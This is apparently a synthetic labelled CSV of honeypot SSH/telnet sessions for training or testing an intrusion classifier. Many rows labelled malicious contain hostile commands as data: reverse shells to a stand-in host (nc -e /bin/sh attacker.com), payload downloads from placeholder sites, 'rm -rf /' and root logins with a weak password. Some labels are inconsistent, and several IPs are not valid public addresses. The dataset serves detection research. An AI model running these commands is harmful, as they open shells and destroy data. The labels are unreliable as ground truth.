session,src_ip,protocol,duration,input_token_count,unique_commands,command_sequence,label
2d455d3a-7d76-4377-a7f1-308736931bb3,236.83.47.52,telnet,700.7,27,5,rm -rf /; python -m http.server 8080; python -m http.server 8080; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444,1
427391d0-c935-486a-9e24-45003c4fde00,105.62.134.65,ssh,115.52,1,2,; ls,0
bd11fa69-8cc5-4f9e-8d3d-1ffa585ddb04,65.53.29.6,ssh,143.46,2,2,; cd /home,0
ambiguous-0,10.0.0.0,ssh,78.90535721,4,2,chmod +x payload.sh; exit; cd /,1
445828fe-83f9-4bdf-a4b2-8aa7140859f9,114.155.208.253,ssh,695.53,14,4,python -m http.server 8080; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x,1
d9631535-e6c0-4c43-9b63-356b780da205,59.165.3.162,ssh,161.82,22,6,sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; ./payload.sh; sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; ./payload.sh; rm -rf /,1
fb7ac6f1-8273-43d1-af49-8bcb5e8bb21f,159.190.96.57,ssh,824.94,13,4,nc -e /bin/sh attacker.com 4444; ./payload.sh; ./payload.sh; curl -O http://badhost/exploit; chmod +x payload.sh,1
a1f0aa12-7816-4978-86c4-370cdd792553,240.171.93.153,telnet,278.63,3,3,whoami; pwd; exit,0
476d037b-aff4-4216-9ef6-8799b09e09d9,52.110.98.231,ssh,614.43,15,5,chmod +x payload.sh; ./payload.sh; ./payload.sh; python -m http.server 8080; curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/,1
106c1ca9-8572-4086-a59b-15c7e88cf8b4,239.79.245.106,ssh,144.49,0,2,; ,0
9b07dbdf-16db-4b97-9292-c3dcb80a2caa,54.14.87.8,ssh,711.7,18,6,./payload.sh; scp exploit.sh root@target:/tmp/; ./payload.sh; ./payload.sh; chmod +x payload.sh; python -m http.server 8080; sshpass -p '1234' ssh root@target,1
5c733d21-2c51-4688-a00c-388a02c37431,163.141.255.175,ssh,304.46,22,7,rm -rf /; wget http://malicious.site/payload.sh; ./payload.sh; scp exploit.sh root@target:/tmp/; python -m http.server 8080; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target,1
9bcf9031-a9a3-4117-a701-338ba67b6682,255.118.146.20,ssh,121.7,3,4,ls; ; ls; uptime,0
175c71ff-a231-4743-960b-d620492387d3,127.149.99.136,ssh,84.07,4,3,logout; ls; date; date,0
0c162c6d-fbea-41a2-91d2-7d13826fe11c,247.34.122.71,telnet,352.54,21,6,chmod +x payload.sh; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; python -m http.server 8080; rm -rf /,1
1edca35f-c5f4-4bdf-8aee-87b06d195e11,117.205.82.252,ssh,781.28,16,4,wget http://malicious.site/payload.sh; ./payload.sh; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444,1
01ddb82d-3738-4804-9ae1-a537cde49492,132.6.133.247,ssh,150.89,4,4,pwd; pwd; exit; logout,0
6f1645ac-6a1b-4121-9433-462a076856a5,111.109.147.4,telnet,217,1,2,uptime; ; ,0
806c8289-c485-4716-846d-61cc1af7213a,83.38.180.182,ssh,222.93,2,2,whoami; pwd,0
ambiguous-extra-115,10.1.0.115,telnet,312.2317402,5,4,date; curl http://exploit; cd /,0
ambiguous-extra-99,10.1.0.99,telnet,325.2147956,5,1,curl http://exploit; exit; wget http://bad.com,1
0ad74c79-adc1-4f65-b8a0-83065ed2873d,19.29.250.173,telnet,261.65,3,4,date; ; logout; exit,0
bb39e6cc-15e5-4699-a9b6-90d7dd82f627,110.192.29.108,telnet,126.58,3,3,logout; logout; pwd,0
9c2369e1-0c60-418b-88d4-b69f51dc8fee,184.47.140.131,ssh,139.46,3,4,pwd; uptime; ; exit,0
8c62580d-cd74-4c30-9dc4-6459cf1f3a47,216.162.76.63,telnet,615.62,19,5,python -m http.server 8080; wget http://malicious.site/payload.sh; python -m http.server 8080; echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; rm -rf /,1
d3f9b5ac-96a1-4233-9b0c-4dfcb44f0332,98.157.211.226,ssh,23.2,17,5,sshpass -p '1234' ssh root@target; chmod +x payload.sh; echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/,1
047d1cf1-427d-48df-9e50-91cbb64def7b,170.30.183.193,ssh,218.07,1,2,; exit,0
68e1f44f-b253-4ccc-b2ba-2e59b469fe3f,222.132.148.68,ssh,883.95,18,6,wget http://malicious.site/payload.sh; ./payload.sh; echo 'pwned' > /tmp/x; rm -rf /; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/,1
2da592ce-57e1-4248-a1be-6ff01f8ebc43,177.42.94.158,ssh,495.38,15,4,./payload.sh; scp exploit.sh root@target:/tmp/; python -m http.server 8080; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/,1
ccc754a5-2d27-4d3a-b572-2bde803b63c6,51.248.135.191,ssh,125.93,4,3,cd /home; logout; date,0
8b665792-4b63-4764-9889-a15c129a7ece,203.123.133.145,ssh,471.07,5,3,pwd; echo test; wget http://suspicious.site/x,1
11dd4ba0-2d9a-4faa-b842-877a96ceb690,54.35.171.92,ssh,14.46,4,3,whoami; ls; uptime; uptime,0
ambiguous-extra-44,10.1.0.44,telnet,509.3617387,12,1,cd /; date; exit; wget http://bad.com; chmod +x payload.sh,1
e47208d2-72e4-4716-bbc5-87c5353c1203,43.201.90.8,ssh,644.62,12,4,curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; ./payload.sh,1
1176dde3-4673-4a11-8e49-d13580f33f8c,56.177.253.126,ssh,7.07,1,2,; ls,0
c09a50ce-5dbe-418d-adec-29ea484d2c50,154.56.113.169,ssh,808.67,16,5,python -m http.server 8080; python -m http.server 8080; wget http://malicious.site/payload.sh; ./payload.sh; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh,1
4d4a051f-861e-4fc5-838b-fac137a9a9f4,194.243.192.133,ssh,294.78,3,3,exit; logout; whoami,0
90b4499d-014f-4b55-81ef-05e84422ce3c,233.229.155.121,ssh,274.21,2,2,exit; uptime,0
fd3aecaf-02c6-4d5c-ab43-0b1f9a3f07d1,156.130.207.223,telnet,356.11,15,6,./payload.sh; sshpass -p '1234' ssh root@target; ./payload.sh; rm -rf /; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/,1
47a1ca42-f924-4c81-9ae1-8e57f9d44e83,150.236.192.29,ssh,740.16,20,5,wget http://malicious.site/payload.sh; curl -O http://badhost/exploit; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; python -m http.server 8080,1
e54f407e-f42e-41c4-a4a9-699d8982c840,64.161.37.192,ssh,85.36,0,2,; ,0
14337a4d-ce7f-470b-82a8-c1078f2ca184,15.133.26.31,ssh,234.96,0,2,; ; ,0
514c324b-c6a2-421c-ab83-f3775286b49b,111.188.129.195,ssh,515.79,16,4,nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; chmod +x payload.sh; rm -rf /,1
d2a5ab6e-a74a-433e-9b58-3f3e2ec957c1,66.64.97.195,ssh,43.85,21,4,scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh,1
c4453d33-e0d6-48a8-ba8f-84a401354e48,85.39.93.135,ssh,693.16,20,3,nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444,1
53c49843-bb6b-4f7c-964d-97e7aebd1253,166.83.179.205,ssh,491.94,20,5,curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; rm -rf /; sshpass -p '1234' ssh root@target; rm -rf /; chmod +x payload.sh,1
ambiguous-extra-1,10.1.0.1,ssh,298.1811755,17,4,curl http://exploit; pwd; chmod +x payload.sh; cd /,1
46b04428-4de5-479e-a525-d8e6089d5cef,71.172.117.59,ssh,450.28,18,3,nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; python -m http.server 8080; python -m http.server 8080,1
93acd755-e9dd-4f57-9e48-4ab23589123c,44.142.233.195,telnet,16.31,1,2,; exit,0
56faa946-7433-4522-a7c0-ab92b5a03ebf,195.147.158.25,ssh,11.38,1,2,; uptime,0
979b57c5-7302-45ee-b723-893213c65760,154.111.211.51,ssh,114.55,3,2,cd /home; pwd,0
8e86509f-ce9c-457c-8f74-6ddcf85dc04d,35.168.193.176,telnet,237.21,2,2,cd /home; ,0
927d5c6b-6fa9-4d60-bc86-50e08c59f935,201.239.141.114,ssh,329.98,21,6,chmod +x payload.sh; ./payload.sh; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/,1
211021f5-317f-45bd-bbc7-3d71e06908df,84.140.206.105,ssh,868.72,18,7,./payload.sh; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; chmod +x payload.sh; curl -O http://badhost/exploit; ./payload.sh; scp exploit.sh root@target:/tmp/,1
0243159f-8d3c-4f58-ae53-0470489d693c,41.98.58.147,ssh,182.23,4,2,cd /home; cd /home,0
e5e93a82-5106-43e4-9d31-19de5aed310c,118.97.197.182,telnet,25.2,4,3,ls; cd /home; ls,0
69bab527-4517-4471-94d1-48b4152da0e4,225.131.118.114,telnet,12.89,3,2,cd /home; date,0
d35944b6-a6be-40c1-bd3a-0db9ea736caf,78.231.240.249,telnet,376.28,20,5,chmod +x payload.sh; ./payload.sh; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444,1
idle-16,192.168.1.16,ssh,712.7334862,0,0,,0
ambiguous-20,10.0.0.20,telnet,256.2037111,8,3,wget http://bad.com; cd /,1
244a0f7d-13e0-402c-a400-9ea574991bf8,105.173.18.74,ssh,617.83,21,5,python -m http.server 8080; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; rm -rf /,1
d22b8dae-fcfb-4296-a2e0-c2c9214b13d6,98.150.178.89,ssh,663.16,19,6,echo 'pwned' > /tmp/x; python -m http.server 8080; wget http://malicious.site/payload.sh; ./payload.sh; sshpass -p '1234' ssh root@target; rm -rf /,1
d14db68e-cce7-4366-b33b-df9b10874ac0,223.253.148.14,ssh,132.07,0,2,; ; ,0
78d9a522-acd8-494c-9145-f1f30954c2e9,199.164.2.86,telnet,537.6,25,4,rm -rf /; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/,1
59252c7b-b65c-4d2f-adcd-15ee1b46544c,11.236.170.149,ssh,3.24,1,2,; ls,0
ambiguous-21,10.0.0.21,telnet,37.7939559,7,4,nc -e /bin/sh attacker.com; ls,1
facc5c1e-9f9b-43f9-a0ba-6092b3959d4a,26.33.251.89,telnet,96.83,17,4,nc -e /bin/sh attacker.com 4444; python -m http.server 8080; chmod +x payload.sh; sshpass -p '1234' ssh root@target,1
db73b772-1b79-450d-a455-59f4e7d66c76,48.28.169.57,ssh,565.39,20,5,echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x,1
361e2a68-03f3-4e1a-b32a-69a480216be6,151.204.61.173,ssh,180.42,2,2,whoami; pwd,0
6b8aacf7-d8a1-4952-b767-aa79b664bfdd,152.26.78.112,ssh,50.53,12,5,wget http://malicious.site/payload.sh; ./payload.sh; python -m http.server 8080; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh,1
1e1c0e8b-f87f-462c-b71a-3ff64bfc3253,190.200.235.165,ssh,299.11,2,2,pwd; logout,0
idle-extra-29,192.168.100.29,telnet,750.1678485,0,0,,0
d40015fa-c681-46c9-b24d-ad8a3731a36e,159.186.213.183,ssh,123.04,1,2,exit; ,0
idle-extra-90,192.168.100.90,ssh,866.0390619,0,0,,0
848d43ba-c024-491b-9b93-a64af6812fb6,148.28.176.118,ssh,7.23,2,3,logout; ; exit,0
6bca68fa-9c31-4fef-a59d-0eee6fdcfa9e,140.62.24.23,telnet,47.77,25,5,scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; rm -rf /,1
22429e37-f15b-4be0-a09d-98973cbafaca,38.234.227.53,ssh,561.98,24,6,nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; echo 'pwned' > /tmp/x; ./payload.sh; sshpass -p '1234' ssh root@target; chmod +x payload.sh; curl -O http://badhost/exploit,1
c23a7bcb-2b87-4a3f-be22-c16d451c7102,138.217.168.32,telnet,87.91,19,5,rm -rf /; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; chmod +x payload.sh; echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh,1
c93aac11-cbee-48f9-8bfc-7e2de9af2d3e,155.242.72.133,ssh,204.56,3,3,date; exit; logout,0
a1d2ff29-5d70-4e9b-b0f2-fc0e889ad9cb,206.167.118.91,ssh,577.61,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
58ab5e75-c19f-42dc-83d4-e73841400e4f,211.121.219.90,ssh,32.17,1,2,exit; ; ,0
4e2d3a0a-19b3-4449-8087-93252b89f627,78.76.139.220,telnet,624.81,23,5,chmod +x payload.sh; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target,1
2fb18470-94aa-4610-828d-cbf381513cb1,183.164.144.14,ssh,897.11,19,6,wget http://malicious.site/payload.sh; ./payload.sh; sshpass -p '1234' ssh root@target; python -m http.server 8080; chmod +x payload.sh; echo 'pwned' > /tmp/x,1
1dac1cb7-d9e4-449e-9b71-8e0cd51247eb,249.174.12.247,ssh,41.18,1,2,ls; ,0
idle-extra-26,192.168.100.26,ssh,941.5436463,0,0,,0
fb753363-9e45-490c-8045-c158597495fb,157.148.181.226,ssh,26.96,19,5,chmod +x payload.sh; wget http://malicious.site/payload.sh; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; python -m http.server 8080; nc -e /bin/sh attacker.com 4444,1
a8b8fa05-d784-4ae0-97aa-1832b208faa6,236.147.116.31,ssh,388.92,23,6,scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; ./payload.sh; chmod +x payload.sh; rm -rf /; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target,1
c5b8d4d5-cda9-4958-85c9-e4a4bf60fdd2,15.202.142.235,telnet,785.12,17,5,./payload.sh; scp exploit.sh root@target:/tmp/; python -m http.server 8080; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444,1
997cdde6-be33-44e8-a655-732f2ea4c2fe,154.18.141.106,ssh,9.86,1,3,; pwd; ,0
549eca31-b300-41e4-9b24-f1dea871c9f7,239.190.167.76,ssh,274.75,2,4,; pwd; ; exit,0
b470b4af-9650-4b7d-90a7-67e20a4c39ad,146.226.22.75,telnet,101.59,2,2,; cd /home,0
3e1de035-b312-4b39-83ca-7949af8de809,192.193.135.175,ssh,9.85,2,3,whoami; ; uptime,0
7fce0615-80de-4b16-a44a-dbd418f4db65,254.156.121.137,ssh,539.1,18,6,python -m http.server 8080; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; chmod +x payload.sh; echo 'pwned' > /tmp/x; ./payload.sh; ./payload.sh,1
e55bb94c-9d30-4385-87c7-c07b130e817c,192.123.247.147,ssh,631.01,25,7,curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit,1
b5dbd970-b997-44f5-bdae-8d703a922341,108.173.121.67,telnet,373.7,11,3,echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh,1
scan-extra-46,172.20.0.46,telnet,0,0,0,,0
c2a721fc-3b9e-40d8-8b0a-ae6a94d220e7,161.108.3.159,ssh,98.6,4,3,pwd; date; logout; date,0
a6c74c79-6e6a-4005-91a3-78c955f263c0,126.170.108.175,ssh,26.66,3,4,date; ; date; exit,0
7ef5c4d1-d98d-4a03-bb9a-8f252ff64065,192.126.182.24,ssh,72.43,5,4,pwd; logout; cd /home; uptime,0
3dd871d6-bf66-44a1-b9d8-b719b9b8bca9,77.174.255.186,ssh,14.05,3,4,; pwd; ; cd /home,0
a1adda55-a6de-4153-ba8a-4fe6065b6e11,185.8.68.34,ssh,414.02,22,4,sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/,1
d79d2c14-56ac-4405-884f-e98b226b2986,63.43.23.21,ssh,15.45,3,4,whoami; uptime; ; logout,0
018a1940-b4a1-4f30-b80e-5c776417e706,82.124.55.142,ssh,156.63,1,2,; date,0
4e1980e6-7648-46ad-929a-faf1a0ad2467,59.99.110.236,ssh,98.06,12,4,./payload.sh; chmod +x payload.sh; curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target,1
9f2a9fa8-ab66-4b6e-a6cc-c4b6abcb296f,166.254.75.111,ssh,363.13,16,5,curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; ./payload.sh; ./payload.sh; rm -rf /; nc -e /bin/sh attacker.com 4444; ./payload.sh,1
7223d980-f67f-4d38-8cf4-1cfbfe2093a8,120.64.57.79,ssh,140.76,6,3,cd /tmp; chmod +x script.sh; ./script.sh,0
a26bf378-19aa-4cae-9787-7c3b7fa1f1d0,194.198.88.87,ssh,6.07,3,3,; uptime; uptime; logout,0
4593e9d1-06ad-4a29-9bcc-c7f863023818,52.50.246.199,ssh,192.21,2,2,date; whoami,0
ambiguous-extra-81,10.1.0.81,ssh,187.6575205,15,4,cd /; curl http://exploit,0
ambiguous-extra-30,10.1.0.30,telnet,579.9845317,7,4,curl http://exploit; date,0
54127e71-cb98-44ca-9379-d1cf8523d6fa,235.219.60.132,telnet,130.47,25,6,wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; ./payload.sh; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/,1
d10aaefb-862f-4524-a3dd-2446e16f62f7,211.111.98.68,ssh,42.17,1,3,; ; ; whoami,0
c7c07120-3e36-4e3a-901c-d45c096fb286,147.114.22.19,ssh,649.12,23,5,wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh,1
2f71e6b8-0656-4478-bc10-29d6095f4b4c,66.120.36.48,ssh,837.33,20,5,rm -rf /; python -m http.server 8080; chmod +x payload.sh; curl -O http://badhost/exploit; python -m http.server 8080; rm -rf /,1
4db735c1-0eb7-4560-9eed-1e8c182cb0b2,52.32.40.50,telnet,175.41,18,6,wget http://malicious.site/payload.sh; curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; rm -rf /; wget http://malicious.site/payload.sh,1
970808bd-f3f6-4fb4-a367-cd1a8c4a6505,130.242.77.50,ssh,842.69,17,4,scp exploit.sh root@target:/tmp/; chmod +x payload.sh; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit,1
6da7f41d-aa3e-4332-84a9-c63e2273376e,189.134.69.89,ssh,553.26,19,4,echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; chmod +x payload.sh,1
2f0f8d23-3730-4e24-952d-59523a9166e9,22.206.41.159,ssh,93.81,25,6,echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; chmod +x payload.sh; chmod +x payload.sh; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit,1
1c5f3df9-8866-4b04-8e35-972a5c252f7e,182.110.141.193,ssh,136.66,4,4,date; whoami; pwd; logout,0
da286d5f-fe53-45c6-95a2-287677df322b,7.52.185.238,ssh,271.35,2,2,ls; ls,0
94618786-5c64-4961-97a8-be6e40629553,123.28.186.22,ssh,453.05,15,4,wget http://malicious.site/payload.sh; rm -rf /; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh,1
8aed5d14-31d1-4d73-9841-918d5d25306c,22.120.166.1,ssh,142.37,2,3,uptime; exit; ,0
ebd7b68c-97ed-4f20-bf5d-baf9e6df7168,140.9.96.66,ssh,15.88,14,5,scp exploit.sh root@target:/tmp/; chmod +x payload.sh; curl -O http://badhost/exploit; ./payload.sh; echo 'pwned' > /tmp/x,1
eee9b8c0-75eb-4865-9bcd-e015ead1cb00,160.215.203.122,ssh,160.49,18,4,curl -O http://badhost/exploit; rm -rf /; wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target,1
05dfa059-73ff-47a7-94cc-2768cb7550e3,170.24.178.69,ssh,64.87,1,2,; exit,0
scan-extra-37,172.20.0.37,telnet,0,0,0,,0
abea25dd-c72c-4729-b1dc-f51e2916bbf7,172.156.58.130,ssh,281.41,6,3,cd /tmp; chmod +x script.sh; ./script.sh,0
0caf86e8-64b4-471f-9cf3-4df14f519838,206.75.128.57,ssh,744.96,18,5,echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target; ./payload.sh; ./payload.sh; python -m http.server 8080,1
idle-extra-40,192.168.100.40,ssh,936.0418527,0,0,,0
65cdb4ef-156b-41ea-b2ac-1bd0e277fea6,110.130.15.166,ssh,33.82,3,4,logout; uptime; ; whoami,0
d8b36f0f-1f33-437c-aaf4-d156784c3275,206.54.208.13,ssh,238.06,2,3,uptime; ; ; uptime,0
434eb6d8-b241-49a9-96b8-f345e87886a4,117.240.66.118,ssh,201.76,2,2,whoami; exit,0
160943a2-500b-4766-bf08-9f8237b669bd,175.120.227.44,ssh,717.82,19,5,echo 'pwned' > /tmp/x; python -m http.server 8080; curl -O http://badhost/exploit; rm -rf /; nc -e /bin/sh attacker.com 4444,1
ambiguous-extra-88,10.1.0.88,ssh,75.01085527,5,2,cd /; pwd; chmod +x payload.sh; nc -e /bin/sh attacker.com; ls,1
e3018315-8e68-4611-bd56-5315dfb0108c,132.96.119.90,telnet,73.06,1,3,; ; ; logout,0
aed09872-4f49-473d-834c-83db6ac4985b,225.16.203.188,ssh,215.35,3,3,cd /home; whoami; ,0
5a2d69c1-96ec-414d-b8ab-fc5cfaaf14b6,48.182.230.173,ssh,22.68,2,3,pwd; ; pwd,0
5d5849e4-0fc0-4fc4-a33e-c8b2d7ed8019,66.194.183.224,ssh,709.32,19,5,wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; python -m http.server 8080,1
6531a110-629b-481b-ab58-57502d09c187,185.111.21.93,ssh,124.38,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
ambiguous-extra-111,10.1.0.111,ssh,107.8034655,17,4,date; exit; wget http://bad.com; pwd,1
8faf9d8e-221f-4119-8462-8a94e701ca2c,113.213.5.222,telnet,70.9,3,3,logout; uptime; whoami,0
4bd458bd-6b10-4129-92f7-0075e6c00a73,61.43.178.80,ssh,197.29,5,4,whoami; cd /home; whoami; uptime,0
e24ecb6a-39b5-4403-bfe8-f707bf78dd27,101.26.17.17,ssh,221.68,2,2,logout; ls,0
47e8937c-09b6-437e-b05f-4a5a495c9aa0,99.63.98.152,ssh,227.06,1,2,; exit,0
d48b68f5-fad0-49a4-9979-22547cb019d2,191.122.24.167,telnet,618.16,13,4,scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; python -m http.server 8080; ./payload.sh; ./payload.sh,1
8d30be05-1030-4681-b44d-7de7f86e6afc,1.40.220.37,ssh,407.32,17,5,curl -O http://badhost/exploit; ./payload.sh; curl -O http://badhost/exploit; ./payload.sh; python -m http.server 8080; sshpass -p '1234' ssh root@target,1
cfe4ddcc-472e-4a11-9b01-07cddafa8809,40.63.108.114,telnet,531.64,5,3,ls; whoami; curl -O http://badhost/file,1
93d362fa-e23a-4fc9-b4b3-5986f6c2c377,221.146.181.182,ssh,266.77,3,2,date; cd /home,0
e9045aba-a6b1-4296-bf42-90896c531b96,145.6.32.70,ssh,108.14,1,2,pwd; ,0
70f2c0d1-1dc7-4c32-8f20-6b7ffc02e8d0,34.78.168.46,ssh,93.26,3,2,cd /home; whoami,0
1063b874-bcca-4019-987e-f6fbcb4178e0,89.224.187.9,ssh,413.88,17,6,wget http://malicious.site/payload.sh; python -m http.server 8080; ./payload.sh; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit,1
50a86bd1-1b23-4220-aad2-95e99437ce1a,101.173.172.252,ssh,199.69,3,2,ls; exit; exit,0
ad96f6a2-cca7-45f4-9292-2ca698df3ae8,72.197.50.191,ssh,200.49,2,2,logout; whoami,0
564c56e7-18c3-4f2c-9afc-7e00a1452752,59.63.217.240,ssh,129.56,1,2,; logout,0
f8c7b9ce-6a65-4ffd-84af-e5b43596d785,51.67.177.85,ssh,523.16,22,7,scp exploit.sh root@target:/tmp/; ./payload.sh; rm -rf /; python -m http.server 8080; curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target,1
aef14528-3ae0-4b5d-89a9-c55eb289a342,130.32.1.188,ssh,456.88,21,5,./payload.sh; sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/,1
31063b1a-e4e9-40ba-bc2d-8ad5c43f7c3a,111.120.188.250,ssh,371.01,22,6,nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; sshpass -p '1234' ssh root@target; python -m http.server 8080; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh,1
